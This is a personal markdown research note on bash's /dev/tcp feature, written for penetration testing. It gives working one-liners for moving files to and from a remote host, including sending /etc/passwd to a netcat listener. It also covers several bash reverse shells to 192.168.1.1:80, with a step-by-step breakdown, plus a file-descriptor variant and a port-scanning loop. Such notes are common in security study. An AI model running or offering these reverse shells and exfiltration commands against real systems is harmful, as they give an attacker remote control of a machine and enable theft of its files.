---
title: Exploring /dev/tcp
date_created: 2021-07-11
date_updated: 
metadata: research
---
# Exploring /dev/tcp 

The goal of this document is to explore the possible utility of the `/dev/tcp` system within the context of penetration testing and general Linux workarounds. Note that this is me exploring the behavior of the system so some things are discovered and assumed through experimentation.

So there exists a system in bash where reads and writes to files in the `/dev/tcp` directory (like `/dev/tcp/host/port`) are interpreted as reads and writes to the corresponding host:port TCP socket. 

Let's consider a locally hosted service on port 9999. If I wanted to write data to it, I could access and write to `/dev/tcp/127.0.0.1/9999` instead of manually going through the process of opening a TCP socket, writing, then closing it.

Since the TCP connection is abstracted as a file, we can leverage other available features in bash like redirects to extend its functionality or to mimic other useful tools that may be missing from the target machine.

## File Transfer

If the target system is missing convenient file transfer utilities like `wget`, `curl`, `nc`, or `socat`, we can mimic their behavior through the `/dev/tcp` system. Consider a target machine that you have command execution on that doesn't have these utilities and a local machine with `nc` available.

1. File Upload

	```bash
	local$ nc -nvlp 80 < file.txt
	remote$ cat </dev/tcp/local/80 > file.txt
	```

2. File Download

	```bash
	local$ nc -nvlp 80 > file.txt
	remote$ cat /etc/passwd >/dev/tcp/local/80
	```

## HTTP Requests

Similarly, for HTTP-specific utilities such as `wget` or `curl`, it would still be possible to mimic their behavior albeit it would be more involved. The following snippet creates a file descriptor `3` to use to reference the connection to the target system. All inputs and outputs are done through the file descriptor.

```bash
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```

For future research: PUT and POST requests.

## Reverse Shells In-Depth

If we want to extend our functionality on the remote system, it would be beneficial to have complete control. This can be done by creating a reverse shell would provide us direct interaction with a shell prompt.

Setup a listener on the local system with `nc` before executing any of the listed reverse shell one-liners.

```bash
local$ nc -nvlp 80
```

The reverse shell depends on bash; the bash binary could either be on `/bin/bash` or `/usr/bin/bash`. Do some initial information gathering on the host to determine the presence and absolute path of the bash shell.

```bash
remote$ /bin/bash -i &> /dev/tcp/192.168.1.1/80 0>&1
remote$ /bin/bash -c 'exec bash -i &> /dev/tcp/192.168.1.1/80 <&1'
```

Breaking down the one-liner:
- `/bin/bash -i` invokes bash in interactive mode. Bash paths may vary depending on installation.
- `&>` instructs bash to redirect STDOUT and STDERR to the next file descriptor. This is equivalent to `>filedescriptor 2>&1` and `>&filedescriptor`.
- `/dev/tcp/192.168.1.1/80` is the file descriptor used to represent the opened read/write socket to the host and port.
- `0>&1` redirects the output from the file descriptor and feeds it into the bash STDIN. This is also equivalent to `0<&1` and `<&1`.

There are possible alternatives of the above which creates its own file descriptors and manipulates those instead. This is similar to the method used for the HTTP requests shown above.

```bash
0<&196-;exec 196<>/dev/tcp/192.168.1.1/80; sh <&196 >&196 2>&196
```

- `0<&196-` closes the file descriptor number 196 in case its open on the remote system. It can be set to any number. Just take note of the special descriptors 0 STDIN, 1 STDOUT, and 2 STDERR.
- `exec 196<>/dev/tcp/196.168.1.1/80` opens the `/dev/tcp/` file descriptor and the corresponding TCP socket for read/write and assigns the file descriptor 196 to it.
- `sh <&196 >&196 2>&196` feeds the output from the socket to STDIN, and redirects STDOUT and STDERR to the created fd.

## Port Scanning

The following snippet will attempt to connect to all the ports for the specified host. If the first call fails, the `echo` command will not execute. This takes advantage of how combining multiple commands with `&&` only executes the second command when the first succeeds.

```bash
seq 1 65535 | while read port; do echo $port 2>/dev/null >/dev/tcp/127.0.0.1/$port && echo $port open; done
```

The following output will be shown when open ports are discovered. It's rudimentary but it could be useful in a pinch.

```
host$ 
80 open
631 open
```